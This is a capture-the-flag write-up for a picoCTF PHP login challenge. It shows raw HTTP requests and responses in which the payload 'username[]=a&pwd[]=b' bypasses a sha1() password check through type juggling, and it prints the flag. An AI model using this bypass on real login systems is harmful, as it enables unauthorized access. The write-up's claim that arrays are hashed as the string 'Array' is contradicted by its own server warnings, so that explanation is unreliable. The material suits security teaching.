# Challenge description

I found a web app that claims to be impossible to hack!

# Soluce

When we go on the website, there is a login page on `/impossibleLogin.php`. A login attempt is done like that:

```html
POST /impossibleLogin.php HTTP/1.1
Host: verbal-sleep.picoctf.net:58281
Content-Length: 26
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Origin: http://verbal-sleep.picoctf.net:58281
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://verbal-sleep.picoctf.net:58281/impossibleLogin.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&pwd=admin
```

The server response is:

```html
HTTP/1.1 200 OK
Date: Tue, 01 Apr 2025 14:38:57 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 1233
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
<br/>Failed! No flag for you
```

After a lot of time, I found that we can pass an array like this:

```html
POST /impossibleLogin.php HTTP/1.1
Host: verbal-sleep.picoctf.net:58281
Content-Length: 28
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Origin: http://verbal-sleep.picoctf.net:58281
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://verbal-sleep.picoctf.net:58281/impossibleLogin.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username[]=admin&pwd=admin
```

The server response is:

```html
HTTP/1.1 200 OK
Date: Tue, 01 Apr 2025 14:56:03 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 1233
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
<br/>Failed! No flag for you
```

To explain that, in PHP, when I send `username=admin`, the server will do this:

```php
$_POST['username'] = "admin";  // one string
```

But when I send `username[]=admin`, the server will do this:

```php
$_POST['username'] = array("admin");  // one array
```

We see that the server is doing a `sha1()` on the `username` variable. Types are not checked in the backend server.

We will send this payload:

```php
username[]=a&pwd[]=b
```

The server will transform it into:

```php
$_POST['username'] = array("a");  // one array
$_POST['pwd'] = array("b");  // one array
```

The server will transform array into string `"Array"` and will do a `sha1()` on it. The server will do this:

```php
sha1("Array") === sha1("Array")  // → true 
```

So we can bypass the login page:

```html
HTTP/1.1 200 OK
Date: Tue, 01 Apr 2025 15:00:53 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 1387
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
picoCTF{w3Ll_d3sErV3d_Ch4mp_5292ca30}
```

So the flag is `picoCTF{w3Ll_d3sErV3d_Ch4mp_5292ca30}`.